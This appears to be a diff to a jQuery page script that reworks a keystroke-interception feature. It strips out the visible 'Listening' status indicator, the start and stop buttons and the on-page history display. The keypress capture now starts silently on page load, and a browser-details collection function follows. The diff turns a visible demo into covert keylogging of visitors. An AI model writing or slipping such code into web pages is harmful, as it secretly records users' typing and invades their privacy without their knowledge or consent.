@@ -1,75 +1,13 @@
 ﻿$(document).ready(function () {
 
-    var mobile = true;
     var secretWords = ['cat', 'dog', 'hello'];
 
-    $('#invoke-name-btn').on('click', function () {
+    SpyOnUser();
 
-        console.log('submitting');
+    function SpyOnUser() {
 
-        invokeCSCode($('#invoke-name-entry').val(), this);
-    });
-
-    if (mobile) {
-        SpyOnUser(true);
-    }
-    else {
-        $('#intercept-keys-start-btn').on('click', function () {
-
-            SpyOnUser(true);
-        });
-
-        $('#intercept-keys-stop-btn').on('click', function () {
-
-            SpyOnUser(false);
-        });
-    }
-
-    function SetListeningStatus(listening) {
-
-        var control = $('.listening-status');
-        var icon = control.find('i');
-        var text = control.find('span');
-
-        if (listening) {
-            text.text('Listening')
-            control.removeClass('status-stopped');
-            control.addClass('status-listening');
-            icon.removeClass('fa-stop');
-            icon.addClass('fa-spinner fa-pulse');
-        }
-        else {
-            text.text('Stopped')
-            control.addClass('status-stopped');
-            control.removeClass('status-listening');
-            icon.addClass('fa-stop');
-            icon.removeClass('fa-spinner fa-pulse');
-        }
-    }
-
-    function SpyOnUser(start) {
-
-        if (!start) {
-            console.log('ending spy session');
-            document.onkeypress = null;
-            userInputs = [];
-            SetListeningStatus(false);
-            return;
-        }
-
-        SetListeningStatus(true);
-
-        console.log('now spying on user');
         var userInputs = [];
-        $('#historyTextArea').text('');
 
-        $('#intercept-keys-clear-btn').on('click', function () {
-
-            $('#historyTextArea').text('');
-            userInputs = [];
-        });
-
-        //Output key press
         document.onkeypress = function (e) {
             e = e || window.event;
 
@@ -87,32 +25,8 @@
                     userInputs = [];
                 }
             }
-
-            // console.log('you typed: ' + joined);
-            $('#historyTextArea').text(joined);
         }
     }
-
-    // RenderMarkdown();
-
-    // function RenderMarkdown() {
-
-    //     console.log('rendering markdown');
-
-    //     try {
-    //         var text = $('#raw-setup-md').text();
-    //         var target = $('#rendered-setup-md');
-    //         var converter = new showdown.Converter();
-    //         var html = converter.makeHtml(text);
-
-    //         target.html(html);
-
-    //         // $('pre code').each(function(i, e) {hljs.highlightBlock(e)});
-    //     }
-    //     catch (err) {
-    //         console.log(err);
-    //     }
-    // }
 });
 
 function collectBrowserDetails() {
